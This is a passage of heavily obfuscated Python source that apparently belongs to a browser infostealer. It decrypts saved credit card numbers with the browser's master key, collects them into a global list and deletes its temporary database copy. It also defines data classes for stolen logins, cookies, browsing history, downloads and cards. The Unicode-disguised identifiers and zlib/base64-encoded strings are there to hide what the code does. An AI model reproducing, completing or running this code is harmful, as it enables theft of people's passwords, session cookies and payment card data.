            if not 𝘳𝙤𝘸[𝙞𝗻𝘵.from_bytes(𝗺𝘢𝙥(lambda O, i: 568 - (𝗶𝗻𝙩(𝙊) + 𝙞), 𝘮𝙖𝘱(__𝗶𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝗶𝙩𝗲𝘳(__𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝙣𝙜𝗲(0)), __𝘪𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝗼𝘄[𝙞𝙣𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 756 - (𝘪𝙣𝘵(𝗢) + 𝗶), 𝘮𝘢𝙥(__𝙞𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝙞𝙩𝘦𝗿(__𝙞𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\n5\x04\x00\x03\x85\x01O')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝘦(1)), __𝘪𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝙤𝘄[𝘪𝘯𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 775 - (𝘪𝙣𝘵(𝗢) + 𝘪), 𝙢𝘢𝙥(__𝗶𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝙞𝘵𝙚𝘳(__𝙞𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xabJ\xae\x02\x00\x03\xea\x01\xa6')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝙚(1)), __𝙞𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝙧𝗼𝘸[𝗶𝙣𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 861 - (𝙞𝙣𝙩(𝗢) + 𝘪), 𝙢𝗮𝙥(__𝙞𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝘁𝘦𝘳(__𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3w\t5\x01\x00\x02\xea\x01\x1d')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝘦(1)), __𝙞𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝙧𝙤𝙬[𝗶𝗻𝘁.from_bytes(𝗺𝙖𝘱(lambda O, i: 688 - (𝗶𝘯𝘁(𝙊) + 𝙞), 𝗺𝙖𝙥(__𝗶𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝙩𝘦𝘳(__𝘪𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcbJ7\x00\x00\x03x\x01P')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝙚(1)), __𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘤𝙖𝗿𝗱_𝙣𝘂𝙢𝘣𝘦𝙧 = 𝘴𝗲𝙡𝙛.decrypt_password(𝗿𝘰𝘸[𝗶𝗻𝘵.from_bytes(𝘮𝗮𝘱(lambda O, i: 930 - (𝗶𝗻𝘵(𝗢) + 𝙞), 𝘮𝗮𝙥(__𝗶𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘵𝗲𝘳(__𝗶𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0f\xf14\x06\x00\x03\x01\x01 ')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝗲(1)), __𝘪𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘀𝘦𝙡𝗳.master_key)
            __𝘊𝗔𝘙𝘋𝘚__.append(𝘛𝘆𝙥𝙚𝘀.CreditCard(𝗿𝙤𝙬[𝙞𝙣𝙩.from_bytes(𝙢𝗮𝗽(lambda O, i: 309 - (𝘪𝗻𝙩(𝘖) + 𝘪), 𝗺𝗮𝗽(__𝙞𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝙞𝙩𝗲𝗿(__𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝙣𝙜𝗲(0)), __𝙞𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝙬[𝙞𝗻𝘵.from_bytes(𝗺𝘢𝗽(lambda O, i: 296 - (𝘪𝙣𝙩(𝘖) + 𝗶), 𝗺𝙖𝗽(__𝗶𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝘁𝗲𝙧(__𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcd\xca6\x04\x00\x03}\x01T')).decode())] * 3)), 𝙧𝙖𝙣𝙜𝙚(1)), __𝘪𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝙬[𝘪𝘯𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 924 - (𝗶𝘯𝘵(𝘖) + 𝗶), 𝗺𝗮𝙥(__𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝘵𝘦𝘳(__𝘪𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0f\xf1\xac\x04\x00\x03G\x01f')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝘦(1)), __𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘤𝘢𝘳𝙙_𝘯𝘂𝘮𝗯𝙚𝘳, 𝘳𝙤𝘸[𝙞𝗻𝘵.from_bytes(𝙢𝗮𝗽(lambda O, i: 632 - (𝗶𝙣𝘵(𝙊) + 𝙞), 𝙢𝗮𝘱(__𝗶𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝗶𝘵𝘦𝙧(__𝙞𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcb\xf24\x01\x00\x03@\x016')).decode())] * 3)), 𝘳𝙖𝗻𝘨𝙚(1)), __𝘪𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝘂𝙧𝘀𝙤𝙧.close()
        𝘤𝙤𝙣𝘯.close()
        𝘰𝘀.remove(__𝙞𝗺𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Types:

    class Login:

        def __init__(self, url, username, password):
            𝘴𝘦𝙩𝙖𝙩𝙩𝙧(𝘀𝗲𝗹𝗳, 'url', 𝘂𝘳𝙡)
            𝘀𝘦𝙩𝙖𝙩𝘵𝙧(𝘀𝘦𝙡𝙛, 'username', 𝙪𝘀𝘦𝗿𝙣𝙖𝗺𝘦)
            𝘴𝙚𝘁𝙖𝙩𝙩𝗿(𝘀𝙚𝘭𝘧, 'password', 𝙥𝘢𝘴𝘴𝙬𝙤𝗿𝙙)

        def __str__(self):
            return __𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝙨𝗲𝗹𝘧.url, 𝘀𝙚𝙡𝘧.username, 𝘴𝘦𝗹𝗳.password)

        def __repr__(self):
            return 𝘀𝙚𝙡𝙛.__str__()

    class Cookie:

        def __init__(self, host, name, path, value, expires):
            𝙨𝗲𝙩𝘢𝙩𝙩𝗿(𝙨𝙚𝘭𝗳, 'host', 𝙝𝙤𝙨𝙩)
            𝘴𝙚𝘵𝙖𝘁𝘵𝙧(𝘴𝙚𝙡𝗳, 'name', 𝙣𝙖𝘮𝘦)
            𝙨𝙚𝙩𝘢𝙩𝙩𝘳(𝙨𝙚𝘭𝙛, 'path', 𝘱𝘢𝘁𝘩)
            𝘴𝙚𝘁𝗮𝘁𝘁𝘳(𝘴𝙚𝘭𝘧, 'value', 𝙫𝙖𝗹𝘂𝘦)
            𝘴𝙚𝙩𝘢𝙩𝙩𝘳(𝙨𝗲𝗹𝘧, 'expires', 𝗲𝘹𝙥𝘪𝘳𝘦𝘀)

        def __str__(self):
            return __𝗶𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK56\xf0J\xc5\x8em\x01m\xd8\x07r')).decode().format(𝘀𝙚𝙡𝙛.host, __𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝙨𝙚𝗹𝘧.expires == 𝘪𝗻𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 840 - (𝘪𝙣𝘁(𝗢) + 𝙞), 𝘮𝗮𝘱(__𝗶𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝙩𝙚𝘳(__𝙞𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝙣𝙜𝘦(0)), __𝗶𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) else __𝘪𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝙨𝗲𝗹𝘧.path, __𝘪𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝘀𝙚𝙡𝘧.host.startswith(__𝘪𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode()) else __𝙞𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝙨𝙚𝙡𝗳.expires, 𝘴𝘦𝘭𝘧.name, 𝘀𝙚𝙡𝗳.value)

        def __repr__(self):
            return 𝘴𝘦𝘭𝘧.__str__()

    class WebHistory:

        def __init__(self, url, title, timestamp):
            𝘴𝘦𝘵𝙖𝙩𝘁𝗿(𝘀𝘦𝘭𝘧, 'url', 𝙪𝗿𝙡)
            𝘀𝘦𝘁𝗮𝘵𝘁𝙧(𝙨𝙚𝙡𝙛, 'title', 𝘵𝗶𝙩𝘭𝙚)
            𝙨𝘦𝙩𝗮𝘵𝘁𝗿(𝘴𝙚𝘭𝘧, 'timestamp', 𝘵𝘪𝙢𝗲𝘴𝘁𝙖𝙢𝙥)

        def __str__(self):
            return __𝗶𝘮𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝘀𝗲𝙡𝗳.url, 𝙨𝘦𝘭𝙛.title, 𝘀𝗲𝙡𝙛.timestamp)

        def __repr__(self):
            return 𝘴𝘦𝗹𝙛.__str__()

    class Download:

        def __init__(self, tab_url, target_path):
            𝘴𝙚𝙩𝘢𝘵𝘵𝘳(𝙨𝗲𝗹𝙛, 'tab_url', 𝙩𝗮𝘣_𝘂𝗿𝗹)
            𝙨𝙚𝙩𝗮𝘵𝙩𝗿(𝘴𝙚𝗹𝘧, 'target_path', 𝙩𝘢𝙧𝘨𝗲𝘵_𝘱𝘢𝘁𝘩)

        def __str__(self):
            return __𝘪𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK56\xf0J56\xb0\x05\x00\t\xf1\x02\x18')).decode().format(𝘴𝗲𝗹𝙛.tab_url, 𝙨𝘦𝗹𝙛.target_path)

        def __repr__(self):
            return 𝘴𝙚𝗹𝙛.__str__()

    class CreditCard:

        def __init__(self, name, month, year, number, date_modified):
            𝙨𝙚𝘁𝗮𝙩𝘁𝗿(𝘴𝙚𝗹𝗳, 'name', 𝙣𝙖𝘮𝙚)
            𝙨𝗲𝙩𝘢𝘵𝘵𝗿(𝘴𝘦𝗹𝗳, 'month', 𝙢𝙤𝘯𝘵𝗵)
            𝘴𝘦𝘵𝘢𝘵𝙩𝘳(𝙨𝙚𝙡𝘧, 'year', 𝘆𝗲𝗮𝘳)
            𝙨𝙚𝙩𝙖𝙩𝘵𝙧(𝘀𝙚𝙡𝙛, 'number', 𝘯𝘶𝗺𝙗𝙚𝙧)
            𝘴𝘦𝘁𝘢𝘁𝘵𝗿(𝘴𝙚𝙡𝘧, 'date_modified', 𝗱𝙖𝘁𝙚_𝙢𝘰𝘥𝗶𝗳𝙞𝙚𝘥)

        def __str__(self):
            return __𝘪𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK56\xf0JE\xc5\xb6\x009\n\x05N')).decode().format(𝘀𝗲𝘭𝙛.name, 𝘴𝙚𝙡𝗳.month, 𝘀𝘦𝗹𝗳.year, 𝘴𝗲𝗹𝙛.number, 𝙨𝙚𝙡𝗳.date_modified)

        def __repr__(self):
            return 𝘴𝗲𝘭𝗳.__str__()